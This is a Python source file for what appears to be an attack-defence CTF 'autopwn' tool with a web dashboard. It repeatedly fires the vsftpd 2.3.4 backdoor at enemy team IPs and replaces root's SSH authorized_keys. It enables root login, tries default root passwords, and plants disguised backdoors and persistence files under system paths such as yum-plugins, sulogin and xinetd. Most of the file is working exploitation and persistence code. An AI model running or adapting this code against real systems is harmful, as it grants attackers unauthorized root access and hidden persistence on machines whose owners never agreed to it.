#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

# Patch pwntools to not die on logging

from pwn import * # Needs to be installed
import time
import md5
import StringIO
from ftplib import FTP
import requests # Needs to be installed
from bottle import route, run, template, response, static_file # Needs to be installed
import peewee # Needs to be installed
from Queue import Queue
from threading import Thread
import json
import argparse

requests.packages.urllib3.disable_warnings()

# Customisations

AUTHORISED_KEY = open("./resources/authorized_keys").read().replace("\n", "\\n")
DATABASE = peewee.SqliteDatabase("sleek.db")

AUTO_PWN_INTERVAL = 10

#logging.basicConfig(filename='example.log',level=20)

# Threading and Queue
Q = Queue(maxsize=0)
NUM_THREADS = 20

def vsftpd_bd(host, port=21, trigger=":)"):
    try:
        r = remote(host, port, timeout=2)
        r.sendline("USER anonymous%s" % trigger)
        r.sendline("PASS")
        r.close()
        log.success("vsftpd exploit [%s] shot at %s:%d" % (trigger, host, port))
    except:
        return None

    try:
        time.sleep(0.3)
        shell_r = remote(host, 6200, timeout=2)
        log.success("vsftpd backdoor opened at %s:6200" % host)
        return shell_r
    except:
        return False

def append_authorized_key(channel):
    channel.sendline("chattr -i /root/.ssh/authorized_keys")
    append_cmd = 'printf "%s" > /root/.ssh/authorized_keys' % AUTHORISED_KEY
    channel.sendline(append_cmd)
    channel.sendline("chattr +i /root/.ssh/authorized_keys")
    channel.sendline("sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config")
    channel.sendline("service sshd restart &")
    time.sleep(0.3)

def robust_upload(shell, upload_files, keyfile, host):
    to_upload = list(upload_files)
    count = 0
    ret = True
    while len(to_upload):
        for i in to_upload:
            try:
                shell.upload_file(filename=i[0], remote=i[1])
                to_upload.remove(i)
            except:
                log.failure("Failed to upload %s to %s. Retrying." % (i[0], i[1]))
        if len(to_upload) == 0:
            return True
        if count < 3:
            count = count + 1
            if keyfile:
                try:
                    shell = ssh(user="root", host=host, keyfile="./keys/sleek.key", timeout=2)
                except:
                    log.failure("Failed to ssh to %s with keyfile in robust uploading." % host)
            else:
                shell = ssh(user="root", host=host, password="password", timeout=2)
                log.failure("Failed to ssh to %s with password in robust uploading." % host)
        else:
            log.failure("Failed to upload everything. Blocked server side. Giving up.")
            return False
    return True

def safe_channel_close(channel):
    channel.sendline("exit")
    channel.close()

# Method 1: Compromise by spawning the vsftpd 2.3.4 backdoor,
#           replacing the root ssh authorized_keys, enabling
#           extra persistence, sabotaging files, and cleaning up
def compromise(host, trigger=":)"):
    bd = vsftpd_bd(host, trigger=trigger)
    if bd:
        append_authorized_key(bd)
        log.success("%s root authorized_keys compromised" % host)
        safe_channel_close(bd)
    else:
        if bd == None:
            log.failure("ftp is not running on %s" % host)
        else:
            log.failure("vsftpd backdoor failed on %s" % host)

    # Stage 2
    auth = False
    try:
        shell = ssh(user="root", host=host, keyfile="./keys/sleek.key", timeout=2)
        auth = True
        keyfile = True
        log.success("Our ssh private key works on %s" % host)
    except:
        log.failure("Our root key is not on %s" % host)

    if not auth:
        try:
            log.info("Trying with default credentials.")
            shell = ssh(user="root", host=host, password="password", timeout=2)
            auth = True
            keyfile = False
            log.success("Default credentials work on %s" % host)
        except:
            log.failure("Default credentials failed on %s" % host)
            return False

    upload_files = [
        ("./resources/cgibd.py", "/usr/lib/yum-plugins/.gh"),
        ("./resources/cat.ascii", "/usr/lib/yum-plugins/cat.asc"),
        ("./resources/suid", "/usr/lib/yum-plugins/sys"),
        ("./resources/pyx.py", "/usr/sbin/pyx"),
        ("./resources/pyx.xinetd", "/etc/xinetd.d/pyx"),
        ("./resources/mailmon", "/usr/sbin/sulogin"),
        ("./resources/pwnscript.sh", "/tmp/cache"),
        ("./resources/vsftpd.lol", "/tmp/cache.1"),
        ]

    robust_upload(shell, upload_files, keyfile, host)
    shell.run_to_end("bash /tmp/cache")
    shell.run_to_end("rm /tmp/cache")
    log.success("%s has been compromised and patched." % host)
    return True



def check_flags(host):
    # Check the public flags
    results = {}

    # Check the web flag
    try:
        lighttpd_flag = requests.get("http://%s" % host, timeout=2).text
        web_hash = md5.md5(lighttpd_flag).hexdigest()
        results['web'] = web_hash == "fa477c36d6c52d52bbd9b6af7df708fa"
    except:
        results['web'] = False

    # Check the ftp flag
    try:
        ftp_conn = FTP(host, user="public", passwd="password", timeout=2)
        ss = StringIO.StringIO()
        ftp_conn.retrbinary("RETR file", ss.write)
        ftp_hash = md5.md5(ss.getvalue()).hexdigest()
        ss.close()
        results['ftp'] = ftp_hash == "4d91498a12508cd7f51fe6d5265ee521"
    except:
        results['ftp'] = False

    log.info("Flags for %s: web is %s | ftp is %s." % (host,
        "unmodified" if results['web'] else "modified",
        "unmodified" if results['ftp'] else "modified"))
    return results

def check_indicators(host):
    # Check the indicators of compromise to determine if a machine has been compromised.
    results = {}

    # Check if port 6660 is open.
    try:
        s = remote(host, 6660, timeout=2)
        results['bigrooms'] = True
        s.close()
    except:
        results['bigrooms'] = False

    # Check if the /cgi/ folder is accessible on :8843
    try:
        req = requests.get("https://%s:8443/cgi/" % host, verify=False, timeout=2)
        if req.status_code == 403:
            results['cgi'] = True
        else:
            results['cgi'] = False
    except:
        results['cgi'] = False
    log.info("Indicators for %s: bigrooms is %s | cgi is %s." % (host,
        "present" if results['bigrooms'] else "not present",
        "present" if results['cgi'] else "not present"))
    return results




# Wrappers
def remove_team(teamid):
    try:
        team = EnemyTeam.get(id=teamid)
    except:
        log.error("Enemy team with id %d does not exist!" % teamid)
        return False
    team.delete_instance()

def do_compromise(teamid):
    try:
        team = EnemyTeam.get(id=teamid)
    except:
        log.error("Enemy team with id %d does not exist!" % teamid)
        return False
    result = compromise(team.ip)
    if not result:
        secondresult = compromise(team.ip, trigger="D8")
        if not secondresult:
            team.compromise_count = team.compromise_count + 1
            team.save(only=team.dirty_fields)
            return False
    team.compromise_count = 0
    team.compromised = True
    team.save(only=team.dirty_fields)
    return True

def do_flagcheck(teamid):
    try:
        team = EnemyTeam.get(id=teamid)
    except:
        log.error("Enemy team with id %d does not exist!" % teamid)
        return False
    result = check_flags(team.ip)
    if result['web']:
        team.webflag = False
    else:
        team.webflag = True
    if result['ftp']:
        team.ftpflag = False
    else:
        team.ftpflag = True
    team.save(only=team.dirty_fields)
    return True

def do_indicatorcheck(teamid):
    try:
        team = EnemyTeam.get(id=teamid)
    except:
        log.error("Enemy team with id %d does not exist!" % teamid)
        return False
    result = check_indicators(team.ip)
    team.brindicator = result['bigrooms']
    team.cgiindicator = result['cgi']
    if not result['bigrooms'] and not result['cgi']:
        team.compromised = False
    team.save(only=team.dirty_fields)
    return True



# Database stuff

class CustomModel(peewee.Model):

    @classmethod
    def get_objects(self):
        return [i for i in self.select().order_by(self.id)]

    class Meta:
        database = DATABASE

class EnemyTeam(CustomModel):
    teamname = peewee.CharField(max_length=200)
    ip = peewee.CharField(max_length=50)
    compromised = peewee.BooleanField(default=False)
    webflag = peewee.BooleanField(default=False) # True means compromised
    ftpflag = peewee.BooleanField(default=False)
    brindicator = peewee.BooleanField(default=False)
    cgiindicator = peewee.BooleanField(default=False)
    compromise_count = peewee.IntegerField(default=0)

class TeamLayouts(CustomModel):
    layout = peewee.CharField(max_length=1000)

def init_database():
    db = DATABASE
    db.connect()

def create_database(configuration):
    # Parse configuration
    config = file(configuration).read().strip().split("\n")
    layoutline = config[0]
    teamlines = config[1:]

    # Create tables
#    EnemyTeam.drop_table(fail_silently=True)
#    TeamLayouts.drop_table(fail_silently=True)

    EnemyTeam.create_table()
    TeamLayouts.create_table()

    # Populate the tables
    # Layout
    teamlayout = TeamLayouts.create(layout=layoutline)
    teamlayout.save()
    # Teams
    for i in teamlines:
        teamname, ip = i.split(":")
        team = EnemyTeam.create(teamname=teamname, ip=ip)
        team.save()

def shutdown_database():
    db = DATABASE
    db.close()




# Threading Stuff

def add_queue(callback, *args):
    Q.put((callback, args))

def queue_compromise(teamid):
    log.info("Queueing compromise for team %d" % teamid)
    add_queue(do_compromise, teamid)

def queue_flagcheck(teamid):
    log.info("Queueing flag check for team %d" % teamid)
    add_queue(do_flagcheck, teamid)

def queue_indicatorcheck(teamid):
    log.info("Queueing indicator check for team %d" % teamid)
    add_queue(do_indicatorcheck, teamid)

def work_it():
    # Work requests should be:
    # (callback, (arguments))
    while True:
        work = Q.get()
        try:
            work[0](*work[1])
        except:
            log.failure("Work failed.")
        Q.task_done()

def monitor_it():
    # Monitors the battlefield for updates
    # Autopwns required targets
    while True:
        uncompromised = EnemyTeam.select().where(EnemyTeam.compromised==False)
        for i in uncompromised:
            if i.compromise_count > 5:
                if (i.compromise_count - 5) % 4 == 0:
                    queue_compromise(i.id)
                else:
                    later = 4 - ((i.compromise_count - 5) % 4)
                    log.info("%s (%s) is unresponsive. Skipping checking this host until %d cycles later." % (i.teamname, i.ip, later))
                    i.compromise_count = i.compromise_count + 1
                    i.save(only=i.dirty_fields)
            else:
                queue_compromise(i.id)
        for i in EnemyTeam.get_objects():
            queue_indicatorcheck(i.id)
            queue_flagcheck(i.id)
        sleep(AUTO_PWN_INTERVAL)

def init_threads():
    for i in range(NUM_THREADS):
        worker = Thread(target=work_it)
        worker.setDaemon(True)
        worker.start()
    master = Thread(target=monitor_it)
    master.setDaemon(True)
    master.start()



# Web Serve stuff

def generate_json():
    obs = EnemyTeam.get_objects()
    elist = []
    for i in obs:
        ed = {
            "id": i.id,
            "teamname": i.teamname, "ip": i.ip,
            "compromised": i.compromised,
            "compromise_count": i.compromise_count,
            "webflag": i.webflag,
            "ftpflag": i.ftpflag,
            "brindicator": i.brindicator,
            "cgiindicator": i.cgiindicator,
            }
        elist.append(ed)
    layouts = TeamLayouts.get_objects()
    if len(layouts) > 0:
        lay = layouts[0].layout
    else:
        lay = ""
    rojb = {'enemies': elist, 'layout': lay}
    j = json.dumps(rojb)
#    print json.dumps(rojb, sort_keys=True, indent=4, separators=(',', ': '))
    return j

@route('/')
def index():
    return template(file("./web/index.html").read())

@route('/compact')
def index():
    return template(file("./web/indexcompact.html").read())

@route('/data')
def dumpdata():
    j = generate_json()
    response.content_type = 'application/json'
    return j

@route('/static/<filename>')
def server_static(filename):
    return static_file(filename, root='./web/static/')

# Main

def main():
    parser = argparse.ArgumentParser(description='Automated noob pwning system with web display.', epilog="Gotta go fast.")
    parser.add_argument("-c", "--configuration", help="Resets the database and uses the new provided configuration to populate the enemy teams.")
    args = parser.parse_args()

    if args.configuration:
        log.info("Removing current database")
        try:
            os.remove("./sleek.db")
        except:
            log.failure("Database does not exist. Not deleting.")
        global DATABASE
        DATABASE = peewee.SqliteDatabase("sleek.db")

        init_database()
        create_database(args.configuration)
    else:
        init_database()
    init_threads()
    run(host='localhost', port=8000)
    shutdown_database()

if __name__ == "__main__":
    main()
